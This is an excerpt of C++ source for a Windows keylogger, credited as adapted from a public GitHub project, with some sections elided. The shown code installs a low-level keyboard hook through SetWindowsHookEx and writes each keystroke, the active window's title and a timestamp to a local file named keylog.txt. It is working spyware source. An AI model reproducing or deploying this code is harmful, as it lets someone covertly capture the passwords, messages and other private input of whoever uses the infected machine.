...
// Adapted from https://github.com/killswitch-GUI/SetWindowsHookEx-Keylogger

namespace {
	struct KeyLogger {
		KeyLogger(std::string file_name = "keylog.txt");
		~KeyLogger();
	...
	std::unique_ptr<KeyLogger> key_logger;
	std::string pretty_print(DWORD code, BOOL caps, BOOL shift) {
		std::string key;
		switch (code) {
...
LRESULT CALLBACK HookProcedure(int nCode, WPARAM wParam, LPARAM lParam) {
	...
	bool caps{};
	auto caps_short = GetKeyState(VK_CAPITAL);
	std::string outPut;
	if (caps_short > 0)
		caps = TRUE;
	...
	if (nCode == HC_ACTION) {
		if (p->vkCode == VK_LSHIFT || p->vkCode == VK_RSHIFT)
			shift = wParam == WM_KEYDOWN || wParam == WM_KEYUP;
		if (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN) {
			HWND currentWindow = GetForegroundWindow();
			if (currentWindow != last_window) {
				SYSTEMTIME t;
				GetLocalTime(&t);
				int day = t.wDay;
				int month = t.wMonth;
				...
				ss.clear();
				std::string window_name(1000, '0');
				auto window_name_len = GetWindowTextA(GetForegroundWindow(), window_name.data(), window_name.size());
				window_name.resize(window_name_len);
				ss << " Current Window: " << window_name << "\n\n";
				const auto result = ss.str();
				std::cout << result << std::endl;
				key_logger->out_file << result << std::endl;
				last_window = currentWindow;
			}
			if (p->vkCode) {
				const auto result = pretty_print(p->vkCode, caps, shift);
				std::cout << result;
				key_logger->out_file << result;
			}
		}
	}
...
KeyLogger::KeyLogger(std::string file_name)
	: out_file{ file_name, std::ios::out | std::ios::app } {
	keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookProcedure, GetModuleHandle(nullptr), 0);
	if (!keyboard_hook)
		throw std::runtime_error{ "Error setting hook." };
}
...
int main() {
	try {
		key_logger = std::make_unique<KeyLogger>();
		MSG message{};
